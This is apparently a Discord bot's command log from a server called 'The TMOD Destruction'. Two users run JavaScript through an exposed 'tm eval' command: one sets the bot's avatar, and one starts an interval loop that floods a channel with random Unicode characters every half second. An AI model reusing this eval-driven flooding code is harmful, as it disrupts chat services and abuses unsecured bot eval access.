+Sat Jun 18 2022 14:38:03 GMT+0000 (Coordinated Universal Time) karbis#5320 | The TMOD Destruction | 987337673012293643: tm eval botRunner.user.setAvatar("https://tr.rbxcdn.com/72795d602ff27a38248c39ae7c80f5a6/150/150/Image/Png ") 
+Sat Jun 18 2022 14:38:32 GMT+0000 (Coordinated Universal Time) bye#6289 | The TMOD Destruction | 987337673012293643: tm eval botRunner.channels.fetch("987338160608538644").then(c => { setInterval(() => { c.send("d                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              ".replaceAll(' ', String.fromCharCode(Math.floor(Math.random() * 65535)))) }, 500) }) 
